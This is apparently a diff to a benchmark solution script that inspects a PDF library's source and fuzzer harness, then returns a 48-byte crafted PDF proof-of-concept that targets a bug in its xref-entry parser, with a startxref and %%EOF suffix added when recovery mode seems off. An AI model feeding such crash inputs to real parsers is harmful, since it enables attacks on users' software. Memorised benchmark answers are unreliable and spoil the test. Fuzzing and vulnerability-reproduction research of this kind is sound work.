@@ -1,50 +1,162 @@
 import os
+import re
 import tarfile
-from typing import Optional
+from typing import Iterator, Tuple, Optional
 
 
 class Solution:
-    def _find_read_xref_entry_source(self, src_path: str) -> Optional[str]:
-        try:
-            if not os.path.isfile(src_path):
-                return None
-            with tarfile.open(src_path, "r:*") as tf:
-                for m in tf.getmembers():
-                    if not m.isfile():
+    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
+        if os.path.isdir(src_path):
+            for root, _, files in os.walk(src_path):
+                for fn in files:
+                    path = os.path.join(root, fn)
+                    try:
+                        st = os.stat(path)
+                    except OSError:
                         continue
-                    name = m.name.lower()
-                    if not (name.endswith((".cc", ".cpp", ".c", ".h", ".hh", ".hpp"))):
-                        continue
-                    f = tf.extractfile(m)
-                    if f is None:
+                    if st.st_size <= 0 or st.st_size > 8 * 1024 * 1024:
                         continue
                     try:
-                        data = f.read()
-                    finally:
-                        f.close()
-                    if b"read_xrefEntry" in data:
+                        with open(path, "rb") as f:
+                            yield path, f.read()
+                    except OSError:
+                        continue
+            return
+
+        if tarfile.is_tarfile(src_path):
+            try:
+                with tarfile.open(src_path, "r:*") as tf:
+                    for m in tf.getmembers():
+                        if not m.isfile():
+                            continue
+                        if m.size <= 0 or m.size > 8 * 1024 * 1024:
+                            continue
                         try:
-                            return data.decode("utf-8", "ignore")
+                            f = tf.extractfile(m)
+                            if f is None:
+                                continue
+                            data = f.read()
+                            yield m.name, data
                         except Exception:
-                            return data.decode("latin-1", "ignore")
-        except Exception:
-            return None
-        return None
+                            continue
+            except Exception:
+                return
+            return
+
+        try:
+            st = os.stat(src_path)
+            if st.st_size <= 0 or st.st_size > 8 * 1024 * 1024:
+                return
+            with open(src_path, "rb") as f:
+                yield src_path, f.read()
+        except OSError:
+            return
+
+    def _looks_text(self, name: str) -> bool:
+        lname = name.lower()
+        exts = (
+            ".c",
+            ".cc",
+            ".cpp",
+            ".cxx",
+            ".h",
+            ".hh",
+            ".hpp",
+            ".hxx",
+            ".inc",
+            ".inl",
+            ".txt",
+            ".md",
+            ".cmake",
+            ".mak",
+            ".make",
+            ".mk",
+            ".am",
+            ".ac",
+            ".sh",
+            ".py",
+            ".java",
+            ".rs",
+        )
+        if lname.endswith(exts):
+            return True
+        base = os.path.basename(lname)
+        if "fuzz" in base or "fuzzer" in base:
+            return True
+        return False
+
+    def _detect_attempt_recovery(self, src_path: str) -> bool:
+        # Return True only if explicitly enabled in fuzzer/harness code.
+        # Otherwise default to False (safer: include startxref).
+        haystack = []
+        for name, data in self._iter_source_files(src_path):
+            if not self._looks_text(name):
+                continue
+            if b"LLVMFuzzerTestOneInput" in data or b"setAttemptRecovery" in data or b"AttemptRecovery" in data:
+                try:
+                    txt = data.decode("utf-8", errors="ignore")
+                except Exception:
+                    continue
+                haystack.append((name, txt))
+
+        if not haystack:
+            for name, data in self._iter_source_files(src_path):
+                if not self._looks_text(name):
+                    continue
+                if b"fuzz" not in name.lower().encode("utf-8", errors="ignore") and b"fuzzer" not in name.lower().encode(
+                    "utf-8", errors="ignore"
+                ):
+                    continue
+                try:
+                    txt = data.decode("utf-8", errors="ignore")
+                except Exception:
+                    continue
+                haystack.append((name, txt))
+
+        true_pats = [
+            r"\bsetAttemptRecovery\s*\(\s*true\s*\)",
+            r"\bset_attempt_recovery\s*\(\s*true\s*\)",
+            r"\battempt_recovery\s*=\s*true\b",
+        ]
+        false_pats = [
+            r"\bsetAttemptRecovery\s*\(\s*false\s*\)",
+            r"\bset_attempt_recovery\s*\(\s*false\s*\)",
+            r"\battempt_recovery\s*=\s*false\b",
+        ]
+
+        saw_any = False
+        saw_true = False
+        saw_false = False
+
+        for _, txt in haystack:
+            for pat in true_pats:
+                if re.search(pat, txt):
+                    saw_any = True
+                    saw_true = True
+            for pat in false_pats:
+                if re.search(pat, txt):
+                    saw_any = True
+                    saw_false = True
+
+        if saw_true and not saw_false:
+            return True
+        if saw_false and not saw_true:
+            return False
+        if saw_true and saw_false:
+            # Prefer safety; include startxref.
+            return False
+        if not saw_any:
+            return False
+        return False
 
     def solve(self, src_path: str) -> bytes:
-        # Primary 48-byte minimized PoC
-        poc = b"%PDF-1.0\nxref\n0 1\n" + (b"0" * 20) + b" 00000 n \n"
+        prefix = b"%PDF-1.0\nxref\n0 1\n"
+        entry = (b"0" * 20) + b" " + (b"0" * 5) + b" f \n"
+        poc48 = prefix + entry  # 48 bytes
 
-        # Optional heuristic: if source strongly suggests EOL1 validation bug, try variant
-        # that places an extra '0' right before '\n' while keeping total length 48.
-        src = self._find_read_xref_entry_source(src_path)
-        if src:
-            s = src
-            # Very lightweight heuristic: mentions of reading two EOL chars and checking only '\n'
-            # often include patterns with '\r' and a secondary char compared to '\n'.
-            if ("\\r" in s) and ("\\n" in s) and ("eol" in s or "end-of-line" in s or "end of line" in s):
-                poc_variant = b"%PDF-1.0\nxref\n0 1\n" + (b"0" * 19) + b" 00000 n 0\n"
-                if len(poc_variant) == 48:
-                    return poc_variant
+        if self._detect_attempt_recovery(src_path):
+            return poc48
 
-        return poc
+        # More reliable: include startxref and %%EOF so non-recovery parsers still reach xref parsing.
+        # xref begins at offset 9 (len("%PDF-1.0\n") == 9).
+        return poc48 + b"startxref\n9\n%%EOF"
